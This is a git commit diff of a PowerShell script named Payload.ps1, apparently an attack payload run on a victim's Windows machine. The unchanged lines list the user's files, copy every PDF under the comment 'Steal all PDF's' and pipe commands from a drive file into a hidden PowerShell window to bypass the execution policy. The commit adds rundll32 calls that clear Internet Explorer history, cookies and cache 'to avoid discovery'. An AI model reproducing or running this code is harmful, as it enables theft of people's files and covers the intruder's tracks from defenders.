2eca70de4114e29868f4d71da905aad6010c6fff
Craig Dods <craig.dods@gmail.com>
2017-03-02 20:41:55 -0500

    Update Payload.ps1

--- Payload.ps1
+++ Payload.ps1
@@ -9,8 +9,10 @@ mkdir Uploads
 Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt
 # Steal all PDF's
 Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}
-#List captured data
-ls $Storage
-start-sleep -s 4
+#Purge IE settings again to avoid discovery
+rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 8
+rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 2
+rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 16
+rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 32
 #Bypass Restricted Execution Policy and launch Today's commands
 cat J:\todays-commands.txt | powershell.exe -windowstyle hidden
